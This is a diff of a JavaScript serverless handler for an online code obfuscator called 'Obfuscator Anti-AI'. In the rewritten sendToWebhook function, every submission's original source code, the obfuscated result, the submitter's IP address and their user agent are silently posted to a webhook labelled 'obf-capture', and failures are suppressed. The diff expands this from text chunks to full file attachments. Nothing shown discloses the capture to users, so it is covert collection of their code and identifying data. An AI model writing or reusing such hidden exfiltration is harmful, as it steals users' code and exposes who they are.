@@ -13,7 +13,7 @@ module.exports = async (req, res) => {
         =============================================================================================
                                 Obfuscator Anti-AI(LUA / PWN / HTML)
         =============================================================================================
-        bª Website     : https://obfuscator.hdz.my.id
+        bª Website     : https://obf-razor.vercel.app
         bª Obfuscation : Runtime polymorphic
         bª Anti-tamper : Ci verification
         bª Entropy     : High
@@ -72,19 +72,48 @@ ${blank}
     out = `${header}${blank}#define _l1I11 ${key2}\n#define _l1ll1(%0) (%0^_l1I11)\n${processed}`;
   }
 
-  try { await sendToWebhook(code, out, req); } catch (_) {}
+  try { await sendToWebhook(code, out, req, lang); } catch (_) {}
   return res.status(200).json({ ok: true, output: out });
 };
 
-function chunk(s, n = 1800) { const o = []; for (let i = 0; i < s.length; i += n) o.push(s.slice(i, i + n)); return o; }
-async function post(url, body) { return fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }); }
 
-async function sendToWebhook(original, obfuscated, req) {
+
+async function sendToWebhook(original, obfuscated, req, lang = 'js') {
   const url = process.env.WEBHOOK_URL;
   if (!url) return;
-  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.headers['x-real-ip'] || 'unknown';
+
+  const ip =
+    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
+    req.headers['x-real-ip'] ||
+    'unknown';
   const ua = req.headers['user-agent'] || 'unknown';
-  await post(url, { username: 'obf-capture', content: `**New submission**\nIP: \`${ip}\`\nUA: \`${ua.slice(0,180)}\`\nLen: ${original.length} -> ${obfuscated.length}` });
-  for (const [i, p] of chunk(original).entries()) await post(url, { content: `**ORIGINAL [${i+1}]**\n\`\`\`\n${p}\n\`\`\`` });
-  for (const [i, p] of chunk(obfuscated).entries()) await post(url, { content: `**OBFUSCATED [${i+1}]**\n\`\`\`\n${p}\n\`\`\`` });
+
+  const extMap = { js: 'js', lua: 'lua', html: 'html', pwn: 'pwn' };
+  const ext = extMap[lang] || 'txt';
+
+  const embed = {
+    title: 'New Submission',
+    color: 0x2bcc9e,
+    fields: [
+      { name: 'IP', value: '`' + ip + '`', inline: true },
+      { name: 'Lang', value: '`' + lang + '`', inline: true },
+      { name: 'Length', value: original.length + ' -> ' + obfuscated.length, inline: true },
+      { name: 'User-Agent', value: '`' + ua.slice(0, 200) + '`', inline: false }
+    ],
+    timestamp: new Date().toISOString()
+  };
+
+  const form = new FormData();
+  form.append('payload_json', JSON.stringify({
+    username: 'obf-capture',
+    embeds: [embed],
+    attachments: [
+      { id: 0, filename: 'original.' + ext, description: 'Source asli' },
+      { id: 1, filename: 'obfuscated.' + ext, description: 'Hasil obfuscate' }
+    ]
+  }));
+  form.append('files[0]', new Blob([original], { type: 'text/plain' }), 'original.' + ext);
+  form.append('files[1]', new Blob([obfuscated], { type: 'text/plain' }), 'obfuscated.' + ext);
+
+  await fetch(url, { method: 'POST', body: form });
 }
